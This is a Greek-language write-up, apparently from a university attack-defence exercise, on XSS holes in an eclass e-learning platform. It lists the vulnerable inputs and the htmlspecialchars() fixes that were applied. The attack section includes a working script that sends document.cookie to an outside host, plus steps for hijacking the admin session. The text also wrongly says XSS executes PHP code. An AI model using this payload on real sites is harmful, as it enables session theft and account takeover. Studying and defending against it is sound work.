# XSS 

Οι xss επιθέσεις μπορούν να χρησιμοποιηθούν ώστε να εκτελεστεί κώδικας php __μέσα__ στο site του αντιπάλου, μέσω της εισαγωγής `<script>(...)</script>`

Στην πλατφόρμα του eclass βρέθηκαν πάρα πολλές τρύπες, καθώς με εξαίρεση ελάχιστα σημεία, το site ήταν εκτεθημένο σε xss attacks. Σε ελάχιστα σημεία (κυρίως σελίδες του διαχειριστή), είχε φτιαχτεί μία συνάρτηση q, η οποία ήταν συντομογραφία για την `htmlspecialchars()`, αλλά παρόλα αυτά, δεν χρησιμοποιούταν σχεδόν καθόλου. Ironically, σε σελίδες με άπειρα user inputs, η συνάρτηση αυτή είχε χρησιμοποιηθεί μόνο μία φορά.

## Defence

Για να αντιμετωπιστούν αυτές οι ευπάθειες, προσπαθήσαμε να εφαρμόσουμε την συνάρτηση `htmlspecialchars()` σε όλες τις περιπτώσεις που υπάρχει user input, και όχι μόνο, __σε όλη την έκταση του eclass__, ακόμα και σε σελίδες του διαχειριστή. Το σκεπτικό μας ήταν πως ακόμα και αν ο αντίπαλος αποκτόυσε πρόσβαση σε περιεχόμενο τύπου admin, δεν θα έπρεπε να ήταν σε θέση να εκτελέσει επιθέσεις xss. Η εφαρμογή της άμυνάς μας, έγινε σε κάθε είδους φόρμες, πρίν την εισαγωγή των δεδομένων στην βάση, και για φόρμες που δεν αποθηκευόταν στην βάση(πχ συζητήσεις μαθήματος), τόσο στην ειδαγωγή των δεδομέων όσο και στην εκτύπωση(better safe than sorry).  Τα σημεία που βρέθηκαν ευπάθειες στο site ήταν:

    - (Μαθημα) -> Περιοχες Συζητησεων -> Νεο θέμα -> "html" επιλογή στον κειμενογράφο -> attack
    - (Μαθημα) -> Ανταλλαγή Αρχείων -> Ανέβασμα αρχείου με περιγραφή κάποιο script -> attack
    - (Μάθημα) -> Τηλεσυνεργασία -> Νεό μήνυμα με script -> Αποστολή -> Νέο μήνυμα με οτιναναι θέμα -> attack
    - Επεξεργασία Προφιλ -> Αλλαγή ονόματος / επιθέτου -> attack
    - (admin) -> Δημιουργία μαθήματος -> σε κάθε user input -> attack
    - (admin) -> Ανακοινωσεις μαθήματος -> σε κάθε user input -> attack
    - (admin) -> Διαχειριση χρηστών -> σε κάθε user input -> attack
    - Δημιουργία χρήστη -> username -> attack
    - (admin) -> Δημιουργία τμήματος -> Όνομα τμήματος script -> attack

Παρατηρήσαμε πως κάθε user input, για να εφανιστεί στην σελίδα, αποθηκευόταν στην μεταβλητή `tool_content`. Επομένως εστιάσαμε την προσοχή μας σε αυτή την μεταβλητή. Επίσης, όταν ο χρήστης καλούταν να συμπληρώσει κάποιου είδους φόρμα, φιλτράραμε τα δεδομένα __πρίν αυτά εισαχθούν και αποθηλευτούν στην βάση δεδομένων__.

Επίσης παρατηρήσαμε οτι πολλές φορές ήταν δυνατόν να εισαχθεί php κώδικας στο url της ιστοσελίδας. Επομένως, αντικαταστήσαμε την μεταβλητή `$_SERVER[PHP_SELF]` όπου αποθηκευόταν το input που έδινε ο χρήστης στο url, με το `$_SERVER[PHP_SELF]` ωστε να μην επιτρέπεται πουθενά η εισαγωγή script, και η επίθεση να αποτραπεί πριν καν επεξεργαστεί απο την σελίδα μας.

Τέλος, τα άλλα modules του μαθήματος δεν είχαν κάποιο user input, και επομένως δεν χρειαζόντουσαν κάποια προστασία απο xss attacks. 

## Attacks

Έχοντας εντοπίσει πληθώρα ευπαθειών στην σελίδα, έγινε προσπάθεια για εισαγωγή script σε κάθε μία απο αυτές τις σελίδες. Αρχικά δοκιμάζαμε την εκτέλεση του κλασσικού alert, για να δούμε αν η επίθεσή μας πετύχαινε. Η κύρια επιδίωξή μας μέσω των xss attacks ήταν να λάβουμε το cookie του αντίπαλου διαχειριστή. Αυτό, γίνεται μέσω του παρακάτω κώδικα.

```php

<script>
    image = new Image();
    image.src = `https://hack-n-roll.csec.di.uoa.gr/?` + document.cookie;
    alert(Wait for it...)
</script>  

```
Με το παραπάνω script, δημιουργούμε μία αίτηση απο την αντίπαλη σελίδα προς την δικιά μας, ενώ μας "πασάρεται" το cookie του του ενεργού session. Επομένως, αν καταφέρουμε να το "φυτρώσουμε" κάπου στο αντίπαλο σαιτ, τότε ο drunkadmin(ή οποιοδήποτε άλλος) συνδεθεί στην σελίδα, αυτόματα θα μας στέλνει το cookie του. Έπειτα, είναι πολύ απλό να μπούμε στην αντίπαλη σελίδα, πηγαίνοντας απο το console του browser μας, και εκτελούμε την εντολή `document.cookie= "cookie_that_we_just_stole"`. Με ένα refresh στην σελίδα, έχουμε συνδεθεί ώς ο χρήστης ο οποίος έκανε άθελά του την αίτηση.

Βέβαια, υπάρχουν και άλλα attacs, προσαρμοσμένα στο περιεχόμενο της κάθε σελίδας όπου εφαρμόζεται η επίθεση. Για παράδειγμα, άν η σελίδα περιέχει κάποια πληροφορία σε μεταβλητή που να μας είναι χρήσιμη (κωδικός str8 from the DB πχ), μπορούμε να προσαρμόσουμε την παραπάνω επίθεση κάνοντας append την μεταβλητή που μας ενδιαφέρει. Όλα τα attacks που δοκιμάστηκαν, υπάρχουν στο αρχείο `xss_puppies` στο παρόν directory(TODO: may change).



